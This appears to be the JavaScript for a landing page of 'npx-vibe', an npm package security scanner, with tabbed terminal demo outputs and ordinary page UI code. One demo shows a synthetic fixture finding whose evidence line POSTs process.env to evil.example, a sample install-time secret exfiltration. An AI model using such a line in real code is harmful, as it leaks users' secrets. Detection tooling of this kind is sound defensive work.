const demos = {
  approve: `$ npx npx-vibe@3.0.0 approve-scripts
! npx-vibe approve-scripts: 2 need review
my-app@1.0.0

Dependencies with install scripts: 4  Already allowed: 2  Already denied: 0
Reviewed now: 2  approve 0  review 2  deny 0

REVIEW   better-sqlite3@11.10.0
  install: prebuild-install || node-gyp rebuild --release
  Install scripts run commands that no automatic rule recognises.

REVIEW   esbuild@0.28.2
  postinstall: node install.js
  network_and_shell: Code combines network access with shell execution.
  Evidence install.js:147: function fetch(url) {
    ... https.get(url, (res) => {
  Evidence install.js:187: child_process.execSync(
    \`npm install --loglevel=error ... \${pkg}@\${packageJSON.version}\`)

No install script was executed during this review.
2 package(s) need a human decision; --write never records those.`,

  scan: `$ npx npx-vibe@3.0.0 is-number@7.0.0
✓ npx-vibe: Proceed  risk 0/100
is-number@7.0.0
Returns true if a number or string value is a finite number.

Known advisories: none found (OSV)
Install hooks: none
Inspected: 1 selected file from 4 package files
Established signals: long registry history, high weekly adoption,
linked GitHub repository

AI review: skipped (No heuristic trigger required model review.)

Action: nothing blocking found. No runnable binary was selected;
this was a read-only scan.`,

  advisory: `$ npx npx-vibe@3.0.0 lodash@4.17.15
! npx-vibe: Caution  risk 55/100
lodash@4.17.15

Known advisories: 6 (OSV)
Install hooks: none

Findings:
- HIGH     known_vulnerability
  6 known advisories for lodash@4.17.15:
  GHSA-35jh-r3h4-6jhm (CVE-2021-23337) HIGH;
  GHSA-p6mc-m468-83gw (CVE-2020-8203) HIGH; and 4 more.
  Evidence: Command Injection in lodash

Action: read the evidence above before running this package.`,

  agent: `$ npx npx-vibe@3.0.0 --agent esbuild@0.28.2
{
  "schemaVersion": 3,
  "tool": { "name": "npx-vibe", "version": "3.0.0" },
  "kind": "package-scan",
  "status": "complete",
  "decision": {
    "verdict": "caution",
    "riskScore": 42,
    "action": "review",
    "exitCode": 2,
    "mayContinue": false,
    "requiresApproval": true,
    "blocked": false,
    "mustStop": false
  },
  "coverage": {
    "scope": "package", "complete": true,
    "requested": 1, "scanned": 1,
    "skipped": 0, "failed": 0, "reasons": []
  }
}`,

  incomplete: `$ npx npx-vibe@3.0.0 project --agent
{
  "schemaVersion": 3,
  "kind": "project-scan",
  "status": "incomplete",
  "decision": {
    "action": "retry", "exitCode": 1,
    "mayContinue": false, "mustStop": true
  },
  "coverage": {
    "scope": "dependency-tree", "complete": false,
    "requested": 2, "scanned": 1,
    "skipped": 1, "failed": 0,
    "reasons": ["local: Workspace/local links are outside the registry-only trust boundary."]
  }
}

A clean scanned subset is not permission to continue.`,

  block: `$ npx npx-vibe@3.0.0 sketchy-package
npx-vibe: Block  risk 100/100
fixture: install-time secret exfiltration

Install hooks: postinstall

Findings:
- CRITICAL possible_secret_exfiltration in postinstall.js
  Code reads environment/secrets and sends data over the
  network from the same code path.
  Evidence line 1: fetch("https://evil.example/collect",
  { method: "POST", body: JSON.stringify(process.env) })

Action: blocked. npx-vibe run --force sketchy-package
overrides this deliberately.`
};

const demoMeta = {
  approve: "Illustrative project output with verified esbuild evidence. --write records only unambiguous, version-pinned decisions; no install script runs.",
  scan: "Abbreviated real scan of is-number@7.0.0, checked October 2, 2026. Source selection is bounded; Proceed is not proof of safety.",
  advisory: "Known advisories come from OSV with no API key. A published CVE raises Caution; it never forces a Block on its own.",
  agent: "Abbreviated schema 3 result from esbuild@0.28.2. Agent mode is read-only; coverage counts subjects, not all source files.",
  incomplete: "Illustrative partial project review. A skipped dependency makes coverage incomplete and requires retry, even if the scanned package is clean.",
  block: "A synthetic fixture. Critical findings require the secret read and the network call to sit on the same code path.",
};


const output = document.querySelector("#demo-output");
const note = document.querySelector("#demo-note");
const tabs = [...document.querySelectorAll(".demo-tab")];
const terminalPanel = document.querySelector(".terminal-panel");
const reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;

function setDemo(name) {
  if (!output || !demos[name]) return;

  output.textContent = demos[name];
  if (note) note.textContent = demoMeta[name];

  if (terminalPanel && !reduceMotion) {
    terminalPanel.classList.remove("is-switching");
    void terminalPanel.offsetWidth;
    terminalPanel.classList.add("is-switching");
  }

  tabs.forEach((tab) => {
    const active = tab.dataset.demo === name;
    tab.classList.toggle("active", active);
    tab.setAttribute("aria-selected", String(active));
  });
}

tabs.forEach((tab) => {
  tab.addEventListener("click", () => setDemo(tab.dataset.demo));
});

tabs.forEach((tab, index) => {
  tab.addEventListener("keydown", (event) => {
    const keys = ["ArrowLeft", "ArrowRight", "Home", "End"];
    if (!keys.includes(event.key)) return;

    event.preventDefault();
    let nextIndex = index;
    if (event.key === "ArrowLeft") nextIndex = (index - 1 + tabs.length) % tabs.length;
    if (event.key === "ArrowRight") nextIndex = (index + 1) % tabs.length;
    if (event.key === "Home") nextIndex = 0;
    if (event.key === "End") nextIndex = tabs.length - 1;

    const nextTab = tabs[nextIndex];
    setDemo(nextTab.dataset.demo);
    nextTab.focus();
  });
});

setDemo("approve");

const siteHeader = document.querySelector(".site-header");

function updateHeader() {
  siteHeader?.classList.toggle("is-scrolled", window.scrollY > 12);
}

updateHeader();
window.addEventListener("scroll", updateHeader, { passive: true });

const revealItems = [...document.querySelectorAll("[data-reveal]")];

if (!reduceMotion && "IntersectionObserver" in window && revealItems.length) {
  // Only hide content once we know we can reveal it again. If this script fails
  // to load, nothing is ever hidden and the page reads normally.
  document.documentElement.classList.add("reveal-on");

  const revealObserver = new IntersectionObserver(
    (entries, observer) => {
      entries.forEach((entry) => {
        // A fast scroll can take an element from below the fold to above it
        // between frames, so anything already past the top counts as seen.
        if (!entry.isIntersecting && entry.boundingClientRect.top > 0) return;
        entry.target.classList.add("is-visible");
        observer.unobserve(entry.target);
      });
    },
    { rootMargin: "0px 0px -8% 0px", threshold: 0 },
  );

  revealItems.forEach((item) => revealObserver.observe(item));
}

document.querySelectorAll("[data-copy]").forEach((button) => {
  const defaultText = button.textContent;

  button.addEventListener("click", async () => {
    try {
      await navigator.clipboard.writeText(button.dataset.copy);
      button.textContent = "Copied";
    } catch {
      button.textContent = "Copy failed";
    }

    setTimeout(() => {
      button.textContent = defaultText;
    }, 1300);
  });
});

// Show npm's official last-week reporting window without dropping zero days.
const numberFormatter = new Intl.NumberFormat("en-US");

function animateNumber(element, total) {
  const finalText = numberFormatter.format(total);

  // requestAnimationFrame is paused in a hidden or background tab, so animating
  // there leaves the placeholder on screen forever. The number matters; the
  // count-up does not.
  if (reduceMotion || document.hidden || typeof requestAnimationFrame !== "function") {
    element.textContent = finalText;
    return;
  }

  const duration = 700;
  const startedAt = performance.now();
  const step = (now) => {
    const progress = Math.min(1, (now - startedAt) / duration);
    if (progress >= 1) {
      element.textContent = finalText;
      return;
    }
    const eased = 1 - (1 - progress) ** 3;
    element.textContent = numberFormatter.format(Math.round(total * eased));
    requestAnimationFrame(step);
  };

  requestAnimationFrame(step);
  // Backstop for a tab hidden mid-animation, which pauses the frames.
  setTimeout(() => {
    element.textContent = finalText;
  }, duration + 300);
}

async function fetchJson(url, timeoutMs) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const response = await fetch(url, {
      headers: { accept: "application/json" },
      signal: controller.signal,
    });
    if (!response.ok) throw new Error(`npm API returned ${response.status}`);
    return await response.json();
  } finally {
    clearTimeout(timeout);
  }
}

function applyTotal(total, from, to) {
  if (!Number.isFinite(total) || total < 0) return false;
  document.querySelectorAll("[data-weekly-downloads]").forEach((element) => {
    animateNumber(element, total);
    element.setAttribute(
      "title",
      `${numberFormatter.format(total)} downloads from ${from} through ${to}`
    );
  });
  return true;
}


async function refreshDownloads() {
  try {
    const payload = await fetchJson("https://api.npmjs.org/downloads/point/last-week/npx-vibe", 12000);
    if (!applyTotal(Number(payload.downloads), payload.start, payload.end)) throw new Error("Invalid download total");
  } catch (error) {
    document.querySelectorAll("[data-weekly-downloads]").forEach((element) => {
      element.textContent = "—";
      element.setAttribute("title", "npm download statistics are currently unavailable");
    });
    console.warn("Could not refresh npm download count:", error.message);
  }
}

refreshDownloads();
